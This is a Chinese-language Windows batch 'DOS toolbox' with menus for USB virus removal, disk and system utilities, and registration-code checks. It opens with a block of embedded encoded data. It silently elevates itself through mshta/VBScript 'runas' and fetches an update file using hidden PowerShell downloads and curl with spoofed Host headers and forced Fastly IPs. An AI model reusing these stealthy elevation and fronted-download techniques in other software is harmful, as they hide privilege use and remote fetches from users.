goto chushihua
剪湫样剩氱呌晌劳倱儳湇歌愰椴代吹栲汴儰晃焊畒敍橊爰橒桤捎楌
汎煢慇佳猵湬搳汏物啵汏捎乡洱呮漹煍畤猳獨畏灦猷昹渶洳椷杪灭
兰捡儵漊敌桳朸搹照猱休捒儷瀰畃汬呏浢挶却丹搰挶攊椸桰爷煇搸
獆愲灇敉氰爷瑌杧樴挵慪剥猰慇桰敦敒晕吴朲剨爸潯啦湁汭呆略挶
佑焱攲瑔汰焱特栵版整剈獑椴挴晔浕漶欹攳氹煈扮渹晵橪潃畉剃浈
樰樹樴獯朵摨汵猷乇晡挰唱戸杨漳刴湔爲灈洊潑欸代副愱佪灣桴摓
桃灤桌焸爷椷瀱併佦摰扊灤慳浡制漰橓椱晅瑡楈戸吴丹卂儳杆匵樊
唷栶匴匶瑊挵住汯呱略牪朳愸瀴昱何瑒执啎爊昷獭汉浇卅估昷渳灆
剪湫样剩氱呌晌劳倱儳湇歌愰椴代吹栲汴儰晃焊畒敍橊爰橒桤捎楌
汎煢慇佳猵湬搳汏物啵汏捎乡洱呮漹煍畤猳獨畏灦猷昹渶洳椷杪灭
兰捡儵漊敌桳朸搹照猱休捒儷瀰畃汬呏浢挶却丹搰挶攊椸桰爷煇搸
獆愲灇敉氰爷瑌杧樴挵慪剥猰慇桰敦敒晕吴朲剨爸潯啦湁汭呆略挶
佑焱攲瑔汰焱特栵版整剈獑椴挴晔浕漶欹攳氹煈扮渹晵橪潃畉剃浈
樰樹樴獯朵摨汵猷乇晡挰唱戸杨漳刴湔爲灈洊潑欸代副愱佪灣桴摓
桃灤桌焸爷椷瀱併佦摰扊灤慳浡制漰橓椱晅瑡楈戸吴丹卂儳杆匵樊
唷栶匴匶瑊挵住汯呱略牪朳愸瀴昱何瑒执啎爊昷獭汉浇卅估昷渳灆
:chushihua
@echo off&cls&title 　&setlocal enabledelayedexpansion
if /i "%1"=="-ks" goto ks
if /i "%1" equ "-chrome" (
	goto chrome
)
if /i "%systemdrive%" equ "x:" goto ks
goto :tgsu
set weizhi=%0
call :su
:tgsu
fltmc 1>nul 2>nul
if "!errorlevel!" equ "0" (
	goto ks
)
verify on
set weizhi=%0
for /f "delims=" %%a in (!weizhi!) do (
	set weizhi=%%~fa
)
if exist %localappdata%\Microsoft\WindowsApps\wt.exe (
	call :stwt
) else (
	call :stcmd
)
rem 在权限申请进程中预读命令提升后面初始化速度
if not exist "!temp!\dos_pre_reading_cache_os.tmp" (
	wmic os get caption /value>"!temp!\dos_pre_reading_cache_os.tmp"
) else (
	type "!temp!\dos_pre_reading_cache_os.tmp"
)
if not exist "!temp!\dos_pre_reading_cache_wmictype.tmp" (
	wmic PATH Win32_SystemEnclosure get ChassisTypes/value>"!temp!\dos_pre_reading_cache_wmictype.tmp"
) else (
	type "!temp!\dos_pre_reading_cache_wmictype.tmp"
)
if not exist "!temp!\dos_pre_reading_cache_hostname.tmp" (
	hostname>"!temp!\dos_pre_reading_cache_hostname.tmp"
) else (
	type "!temp!\dos_pre_reading_cache_hostname.tmp"
)
if not exist "!temp!\dos_pre_reading_cache_zmlj.tmp" (
	reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v desktop>"!temp!\dos_pre_reading_cache_zmlj.tmp"
) else (
	type "!temp!\dos_pre_reading_cache_zmlj.tmp"
)
::start /min %comspec% /c powershell -noprofile start-process -filepath "%comspec%" -argumentlist '"/c %0 -ks"' -verb runas
::start /min %comspec% /c powershell -noprofile start-process -filepath "wt" -argumentlist '"%0 -ks"' -verb runas>nul 2>nul
exit 0
if exist "%windir%\system32\tar.exe" (
	tar -xf %0 -C %temp%>nul 2>nul
	if !errorlevel! neq 0 (
		goto curlxz
	)
	pushd %temp%
	start /min %comspec% /c dwnl https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/update.js dostoolupdate>nul 2>nul
	popd
	exit 0
) else (
	for /f "delims=" %%a in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\7zFM.exe" /v path^|findstr /c:"path"') do (
		set 7zpath=%%a
		set 7z1=!7zpath:~22!
		set 7z2=!7zpath:~16!
		pause
		if exist "!7z1!7z.exe" (
			"!7z1!7z.exe" x %0 -o%temp%>nul 2>nul
			if !errorlevel! neq 0 (
				goto curlxz
			)
		) else (
			"!7z2!7z.exe" x %0 -o%temp%>nul 2>nul
			if !errorlevel! neq 0 (
				goto curlxz
			)
		)
		pushd %temp%
		start /min %comspec% /c dwnl https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/update.js dostoolupdate>nul 2>nul
		popd
		exit 0
	)
)
:curlxz
(
set xzflag1=
set xzflag=rem
set ddf=DownloadFile
set resolve=fastly.com:443:151.101.1.229,151.101.129.229,151.101.193.229,151.101.65.229,2a04:4e42::485,2a04:4e42:200::485,2a04:4e42:400::485,2a04:4e42:600::485
)
if exist %systemroot%\system32\curl.exe (
    set xzflag1=rem
    set xzflag=
)
%xzflag% cd /d %temp%
%xzflag% start /min %comspec% /c curl -H "host: cdn.jsdelivr.net" -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 5 --resolve !resolve! -o dostoolupdate https://fastly.com/gh/Trustedinstall/dostool/update.js
%xzflag1% powershell -w hidden -c (new-object System.Net.WebClient).%ddf%( 'https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/update.js','%temp%\dostoolupdate')
exit 0
:stwt
start /min %comspec% /c mshta vbscript:createobject("shell.application").shellexecute("%localappdata%\Microsoft\WindowsApps\wt.exe","%weizhi% -ks","","runas",1)(window.close)
goto :eof
:stcmd
start /min %comspec% /c mshta vbscript:createobject("shell.application").shellexecute("%weizhi%","-ks","","runas",1)(window.close)
goto :eof
set qidongjd=0
set qidongbz=█████████████████
:qidong
cls
echo 正在加载环境变量...
echo                                当前进度:%qidongjd%%%
echo  ----------------------------------------------------------------------------
echo │%qidongbz%│
echo  ----------------------------------------------------------------------------
set qidongbz=%qidongbz%█
set/a qidongjd+=5
if "%qidongjd%"=="105" goto ks
goto qidong
:ks
(
set dosqssj=%time%
title 　
color f1
setlocal enabledelayedexpansion
chcp 936>nul
set ver=20240729
set versize=237110
set resolve=--resolve fastly.com:443:^
151.101.129.57,^
151.101.193.57,^
151.101.65.57,^
151.101.1.57,^
2a04:4e42:400::313,^
2a04:4e42:200::313,^
2a04:4e42:600::313,^
2a04:4e42::313
set jshost=-H "host: cdn.jsdelivr.net"
set githost=-H "host: raw.githubusercontent.com"
set gxurlhost1=https://fastly.com/Trustedinstall/dostool/main/update.js
set gxurlhost2=https://fastly.com/gh/Trustedinstall/dostool/update.js
set gxurl1=https://raw.githubusercontent.com/Trustedinstall/dostool/main/update.js
set gxurl2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/update.js
set gxdoshost1=https://fastly.com/Trustedinstall/dostool/main/dostool.js
set gxdoshost2=https://fastly.com/gh/Trustedinstall/dostool/dostool.js
set gxdos1=https://raw.githubusercontent.com/Trustedinstall/dostool/main/dostool.js
set gxdos2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/dostool.js
rem if exist %temp%\dwnl.exe (set /a versize=versize+3194)
set gxflag=
set baidu=start https://www.baidu.com/s?wd=
set google=start https://www.google.com.hk/search?q=
set sc=delasd123
set scw=rdasd123
set weizhi=%0
rem set cishu=3
set ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
set nx1=[+]下一页&set nx=[-]上一页   [+]下一页&set nx7=[-]上一页
if exist "!temp!\dos_pre_reading_cache_wmictype.tmp" (
	set "wmictype='"type "!temp!\dos_pre_reading_cache_wmictype.tmp""'"
) else (
	set "wmictype='"wmic PATH Win32_SystemEnclosure get ChassisTypes /value"'"
)
for /f "tokens=2 delims=={}" %%a in (!wmictype!) do (
	if %%a==8 set nx1=[S]下一页&set nx=[A]上一页   [S]下一页&set nx7=[A]上一页
	if %%a==9 set nx1=[S]下一页&set nx=[A]上一页   [S]下一页&set nx7=[A]上一页
	if %%a==10 set nx1=[S]下一页&set nx=[A]上一页   [S]下一页&set nx7=[A]上一页
)
)
if exist "!temp!\dos_pre_reading_cache_zmlj.tmp" (
	set "zmlj=!temp!\dos_pre_reading_cache_zmlj.tmp"
) else (
	set "zmlj='"reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v desktop"'"
)
for /f "skip=2 delims=" %%a in (!zmlj!) do (
	set zmlj=%%a
	if not defined zmlj (
		set zmlj=X:\Users\Default\Desktop\
	)
	if "!zmlj:~0,1!!zmlj:~-1!" neq """" (
		for /f "delims=" %%a in ("!zmlj!") do (
			set !zmlj!="%%~a"
		)
	)
)
for /f "delims=" %%a in ("%0") do (
	set daxiao=%%~za
	set disk=%%~da
)
if exist "!temp!\dos_pre_reading_cache_hostname.tmp" (
	set "zjname=!temp!\dos_pre_reading_cache_hostname.tmp"
) else (
	set "zjname='"hostname"'"
)
for /f "delims=" %%a in (!zjname!) do set hostname=%%a
for /f "tokens=3 delims=." %%a in ('"ver"') do (
	if %%a lss 10586 (
		set winv=1
	) else (
		set winv=0
	)
)
if exist "!temp!\dos_pre_reading_cache_os.tmp" (
	set "wmicos='"type "!temp!\dos_pre_reading_cache_os.tmp""'"
) else (
	set "wmicos='"wmic os get caption /value"'"
	set comd=1
)
for /f "skip=2 tokens=2 delims==" %%a in (!wmicos!) do (
	set system=%%a
	if "!comd!" equ "1" (
		set "system=!system:~0,-1!"
		set comd=
	)
	for /f "tokens=3" %%a in ("!system!") do (
		if "%%a" equ "11" (
			call :pd11
			goto jspd
		)
		if "%%a" equ "10" (
			call :pd10
			goto jspd
		)
		if "%%a" equ "8.1" (
			call :pd8.1
			goto jspd
		)
		if "%%a" equ "8" (
			call :pd8
			goto jspd
		)
		if "%%a" equ "7" (
			call :pd7
			goto jspd
		)
		if /i "%%a" equ "XP" (
			call :pdxp
			goto jspd
		)
	)
:jspd
	if "!zmlj:~0,1!!zmlj:~-1!" neq """" (
		for /f "delims=" %%a in ('"echo %zmlj%"') do (
			set !zmlj!="%%~a"
		)
	)
)
if "%date:~11,1%" equ "周" (
	set "xingqi=%date:~11,2%"
) else (
	set "xingqi=%date:~11,3%"
)
for /f %%a in ('"echo prompt $E^ |cmd"') do (
	set cswz=%%a[
	set cswz1=%%a
)
call :list
if /i "%processor_architecture%"=="x86" (set bit=32) else (set bit=64)
if exist !systemroot!\system32\choice.exe (
	set "sel=call :choice"
) else (
	set "sel=set /p shuru=输入你的选择:<nul"
)
if /i "%2" neq "" goto %2
rem call :xsjc !dosqssj! !time! jg
goto memuv2
for /f "delims=" %%a in ('"wmic cpu get processorid|find /i /v "processorid""') do (for /f "delims=" %%b in ('"echo %%a|find /i /v "echo""') do (set a=%%b))
for /f "delims=" %%a in ('"wmic bios get smbiosbiosversion|find /i /v "smbiosbiosversion""') do (for /f "delims=" %%b in ('"echo %%a|find /i /v "echo""') do (set b=%%b))
set jqm=%a: =%%b: =%
for /l %%a in (1,1,1000) do (if "!jqm:~%%a,1!"=="" set ws=%%a&goto jqmzh)
:jqmzh
set cs=0
set/a ws=%ws%-1
:zhcl
set/a zjzcm=0x!jqm:~%cs%,1!*2+3>nul 2>nul
set zh=%zh%%zjzcm%
set/a cs=%cs%+1
if %cs%==%ws% goto zcm
goto zhcl
:zcm
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\System\DOS工具箱 /v 机器码 2>nul|find "机器码""') do (set sfzc=%%a)
set sfzc=%sfzc:~21%
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\System\DOS工具箱 /v 注册码 2>nul|find "注册码""') do (set sfzcm=%%a)
set sfzcm=%sfzcm:~21%
if /i %sfzc%==%jqm% if /i %sfzcm%==%zh% goto memuv2
:ks1
color f1
title 注册码验证%system%
cls
echo                                     菜单
echo 现在是%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo 机器码:%jqm%
set mima=
set/p mima=请输入注册码:
if /i "!mima!"=="!zh!" goto yes
echo 注册码错误
ping/n 2 0.0>nul
goto ks
:yes
cls
echo                                     菜单
echo 现在是%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%
echo _______________________________________________________________________________
reg add HKEY_CURRENT_USER\System\DOS工具箱 /v 机器码 /d %jqm% /f>nul 2>nul
reg add HKEY_CURRENT_USER\System\DOS工具箱 /v 注册码 /d %mima% /f>nul 2>nul
echo 注册成功
ping/n 2 0.0>nul
goto memuv2
:mima
color f1
title 密码验证%system%
cls
echo                                     菜单
echo 现在是%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%
echo _______________________________________________________________________________
set mima=
set/p mima=请输入密码:
set /p ="!mima!"<nul>%temp%\mima.tmp
call :hash %temp%\mima.tmp
del /f /q %temp%\mima.tmp
if /i "%hash%"=="DCA9A6E6D000573FDC4DF6FEBA6035B87A8CE07C" goto mima1
set/a cishu-=1
echo 密码错误！你还有%cishu%次机会
ping/n 2 0.0>nul
if %cishu%==0 goto 00
goto mima
:mima1
cls
echo                                     菜单
echo 现在是%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo 密码正确！
ping/n 2 0.0>nul
goto memuv2
:memuv2
if !start! lss 1 set start=1
set /a memuys=!start!/9+1
if not defined a!start! set /a !start!=!start!-9
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
set fy=!cswz!!ysbak:~0,3!91m_!cswz!!ysbak!!cswz!!ysbak:~0,3!92m_!cswz!!ysbak!!cswz!!ysbak:~0,3!93m_!cswz!!ysbak!
set fy1=___
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - 检查到更新版本: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS工具箱%system%%gxflag%
cls
rem echo;初始化用时: !jg!
if !winv! equ 0 (echo                                     菜单 - 第!cswz!!ysbak:~0,3!92m!memuys!!cswz!!ysbak!页) else (
set /p =!cswz1!　　　　　　　　　　　　　　　　　　菜单 - 第<nul
call :colortxt a !memuys!
set /p =页<nul
echo;)
echo 现在是%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%
if !winv! equ 0 (for /l %%a in (1,1,26) do (if %%a lss 26 (set /p =!fy!<nul) else (echo !fy!))) else (for /l %%a in (1,1,26) do (if %%a lss 26 (set /p =!fy1!<nul) else (echo !fy1!)))
set /a end=!start!+8
set xx=0
for /l %%a in (!start!,1,!end!) do (if defined a%%a (set /a xx=!xx!+1&echo [!xx!]!a%%a!&set xz!xx!=%%a))
set /a pd=!end!+1
if !winv! equ 0 (if not defined a!pd! (echo [0]退出                                             !cswz!42;97m%nx7%!cswz!!ysbak!)) else (
if not defined a!pd! (
set /p =[0]退出<nul
set /p =.!cswz1!　　　　　　　　　　　　　　　　　　　　<nul
call :colortxt 2f %nx7%
echo;))
set /a pd1=!start!-1
if !winv! equ 0 (if !pd1! lss 1 (echo [0]退出                                                         !cswz!42;97m%nx1%!cswz!!ysbak!)) else (
if !pd1! lss 1 (
set /p =[0]退出<nul
set /p =.!cswz1!　　　　　　　　　　　　　　　　　　　　<nul
call :colortxt 2f %nx1%
echo;))
if !winv! equ 0 (if defined a!pd! (if not !pd1! lss 1 echo [0]退出                                             !cswz!42;97m%nx1%   %nx7%!cswz!!ysbak!)) else (
if defined a!pd! (
if not !pd1! lss 1 (
set /p =[0]退出<nul
set /p =.!cswz1!　　　　　　　　　　　　　　　　　　　　<nul
call :colortxt 2f %nx1%
set /p =.!cswz1!　　　<nul
call :colortxt 2f %nx7%
echo;)))
::if !start! equ 1 (echo [0]退出                                                         !cswz!42;97m%nx1%!cswz!!ysbak!) else (if !start! equ 64 (echo [0]退出                                                      !cswz!42;97m%nx7%!cswz!!ysbak!) else (echo [0]退出                                             !cswz!42;97m%nx%!cswz!!ysbak!))
if !winv! equ 0 (for /l %%a in (1,1,26) do (if %%a lss 26 (set /p =!fy!<nul) else (echo !fy!))) else (for /l %%a in (1,1,26) do (if %%a lss 26 (set /p =!fy1!<nul) else (echo !fy1!)))
set caidan=
set/p caidan=请输入你的选择:
if "!caidan!" equ "1" if !xz1! lss 10 (goto 0!xz1!) else (goto !xz1!)
if "!caidan!" equ "2" if !xz2! lss 10 (goto 0!xz2!) else (goto !xz2!)
if "!caidan!" equ "3" if !xz3! lss 10 (goto 0!xz3!) else (goto !xz3!)
if "!caidan!" equ "4" if !xz4! lss 10 (goto 0!xz4!) else (goto !xz4!)
if "!caidan!" equ "5" if !xz5! lss 10 (goto 0!xz5!) else (goto !xz5!)
if "!caidan!" equ "6" if !xz6! lss 10 (goto 0!xz6!) else (goto !xz6!)
if "!caidan!" equ "7" if !xz7! lss 10 (goto 0!xz7!) else (goto !xz7!)
if "!caidan!" equ "8" if !xz8! lss 10 (goto 0!xz8!) else (goto !xz8!)
if "!caidan!" equ "9" if !xz9! lss 10 (goto 0!xz9!) else (goto !xz9!)
if "!caidan!" equ "0" exit 0
if "!caidan!" equ "-" (set /a pd=!start!-1&if not !pd! lss 1 set /a start=!start!-9&goto memuv2)
if "!caidan!" equ "+" (set /a pd=!end!+1&if defined a!pd! set /a start=!start!+9&goto memuv2)
if /i "!caidan!" equ "a" (set /a pd=!start!-1&if not !pd! lss 1 set /a start=!start!-9&goto memuv2)
if /i "!caidan!" equ "s" (set /a pd=!end!+1&if defined a!pd! set /a start=!start!+9&goto memuv2)
if /i "!caidan!" equ "vbsjsq" set tzwz=!start!&goto vbsjsq
if /i "!caidan!" equ "guanji" set tzwz=!start!&goto guanji
if "!caidan!" equ "BATJIAMI" set tzwz=!start!&goto batjiami
if /i "!caidan!" equ "guanyu" set tzwz=!start!&goto guanyu
if /i "!caidan!" equ "csh" goto chushihua
if /i "!caidan!" equ "kcd" set tzwz=!start!&goto kcd
if /i "!caidan!" equ "gcd" set tzwz=!start!&goto gcd
if /i "!caidan!" equ "xz" set tzwz=!start!&goto xz
if /i "!caidan!" equ "js" set tzwz=!start!&goto 49
if /i "!caidan!" equ "gx" set tzwz=!start!&goto update
if /i "!caidan!" equ "go1" set start=1&goto memuv2
if /i "!caidan!" equ "go2" set start=10&goto memuv2
if /i "!caidan!" equ "go3" set start=19&goto memuv2
if /i "!caidan!" equ "go4" set start=28&goto memuv2
if /i "!caidan!" equ "go5" set start=37&goto memuv2
if /i "!caidan!" equ "go6" set start=46&goto memuv2
if /i "!caidan!" equ "go7" set start=55&goto memuv2
if /i "!caidan!" equ "go8" set start=64&goto memuv2
if /i "!caidan!" equ "go9" set start=73&goto memuv2
echo 请输入正确的选项！
timeout /t 2 /nobreak>nul
goto memuv2
:a
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - 检查到更新版本: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS工具箱%system%%gxflag%
cls
echo                                     菜单 - 第!cswz!!ysbak:~0,3!92m1!cswz!!ysbak!页
echo 现在是%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]清除U盘里的lpk.dll病毒
echo [2]清除U盘里的jwgkvsq.vmx病毒，并免疫该病毒
echo [3]清理系统垃圾
echo [4]显示系统信息
echo [5]解除任务管理器被禁用
echo [6]显示被隐藏文件(中了该类病毒后)
echo [7]解除注册表被禁用
echo [8]计算开平方
echo [9]切换到命令提示符
echo [0]退出                                                         !cswz!42;97m%nx1%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=请输入你的选择:
if "!caidan!"=="1" goto 01
if "!caidan!"=="2" goto 02
if "!caidan!"=="3" goto 03
if "!caidan!"=="4" goto 04
if "!caidan!"=="5" goto 05
if "!caidan!"=="6" goto 06
if "!caidan!"=="7" goto 07
if "!caidan!"=="8" goto 08
if "!caidan!"=="9" goto 09
if "!caidan!"=="0" goto 00
if "!caidan!"=="+" goto memuv2
if /i "!caidan!"=="s" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=a&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=a&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=a&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=a&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=a&goto kcd
if /i "!caidan!"=="gcd" set tzwz=a&goto gcd
if /i "!caidan!"=="xz" set tzwz=a&goto xz
if /i "!caidan!"=="js" set tzwz=a&goto 49
if /i "!caidan!"=="gx" set tzwz=a&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i "!caidan!"=="go7" goto memuv2
if /i "!caidan!"=="go8" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto memuv2
:b
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - 检查到更新版本: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS工具箱%system%%gxflag%
cls
echo                                     菜单 - 第!cswz!!ysbak:~0,3!92m2!cswz!!ysbak!页
echo 现在是%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]将磁盘格式转换为NTFS
echo [2]磁盘错误修复
echo [3]格式化
echo [4]DOS计算器
echo [5]解除命令提示符被禁用
echo [6]随机数生成器
echo [7]清除KHATRA病毒
echo [8]打开注册表
echo [9]打开控制面板
echo [0]退出                                             !cswz!42;97m%nx%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=请输入你的选择:
if "!caidan!"=="1" goto 10
if "!caidan!"=="2" goto 11
if "!caidan!"=="3" goto 12
if "!caidan!"=="4" goto 13
if "!caidan!"=="5" goto 14
if "!caidan!"=="6" goto 15
if "!caidan!"=="7" goto 16
if "!caidan!"=="8" goto 17
if "!caidan!"=="9" goto 18
if "!caidan!"=="0" goto 00
if "!caidan!"=="-" goto memuv2
if "!caidan!"=="+" goto memuv2
if /i "!caidan!"=="a" goto memuv2
if /i "!caidan!"=="s" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=b&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=b&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=b&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=b&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=b&goto kcd
if /i "!caidan!"=="gcd" set tzwz=b&goto gcd
if /i "!caidan!"=="xz" set tzwz=b&goto xz
if /i "!caidan!"=="js" set tzwz=b&goto 49
if /i "!caidan!"=="gx" set tzwz=a&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i "!caidan!"=="go7" goto memuv2
if /i "!caidan!"=="go8" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto memuv2
:c
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - 检查到更新版本: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS工具箱%system%%gxflag%
cls
echo                                     菜单 - 第!cswz!!ysbak:~0,3!92m3!cswz!!ysbak!页
echo 现在是%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]打开DirectX诊断工具
echo [2]打开计算机管理
echo [3]用户管理
echo [4]打开组策略
echo [5]DOS任务管理器
echo [6]文件系统信息查询
echo [7]创建指定大小的文件
echo [8]免疫U盘病毒
echo [9]磁盘碎片整理
echo [0]退出                                             !cswz!42;97m%nx%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=请输入你的选择:
if "!caidan!"=="1" goto 19
if "!caidan!"=="2" goto 20
if "!caidan!"=="3" goto 21
if "!caidan!"=="4" goto 22
if "!caidan!"=="5" goto 23
if "!caidan!"=="6" goto 24
if "!caidan!"=="7" goto 25
if "!caidan!"=="8" goto 26
if "!caidan!"=="9" goto 27
if "!caidan!"=="0" goto 00
if "!caidan!"=="-" goto memuv2
if "!caidan!"=="+" goto memuv2
if /i "!caidan!"=="a" goto memuv2
if /i "!caidan!"=="s" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=c&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=c&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=c&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=c&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=c&goto kcd
if /i "!caidan!"=="gcd" set tzwz=c&goto gcd
if /i "!caidan!"=="xz" set tzwz=c&goto xz
if /i "!caidan!"=="js" set tzwz=c&goto 49
if /i "!caidan!"=="gx" set tzwz=c&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i "!caidan!"=="go7" goto memuv2
if /i "!caidan!"=="go8" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto memuv2
:d
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - 检查到更新版本: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS工具箱%system%%gxflag%
cls
echo                                     菜单 - 第!cswz!!ysbak:~0,3!92m4!cswz!!ysbak!页
echo 现在是%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]一键删除空文件夹
echo [2]ping测试网络延迟
echo [3]硬件检测
echo [4]读心术
echo [5]DOS闹钟
echo [6]计时器
echo [7]随机密码生成器
echo [8]删除每个盘符下的System Volume Information文件夹
echo [9]二进制转换器
echo [0]退出                                             !cswz!42;97m%nx%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=请输入你的选择:
if "!caidan!"=="1" goto 28
if "!caidan!"=="2" goto 29
if "!caidan!"=="3" goto 30
if "!caidan!"=="4" goto 31
if "!caidan!"=="5" goto 32
if "!caidan!"=="6" goto 33
if "!caidan!"=="7" goto 34
if "!caidan!"=="8" goto 35
if "!caidan!"=="9" goto 36
if "!caidan!"=="0" goto 00
if "!caidan!"=="-" goto memuv2
if "!caidan!"=="+" goto memuv2
if /i "!caidan!"=="a" goto memuv2
if /i "!caidan!"=="s" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=d&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=d&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=d&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=d&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=d&goto kcd
if /i "!caidan!"=="gcd" set tzwz=d&goto gcd
if /i "!caidan!"=="xz" set tzwz=d&goto xz
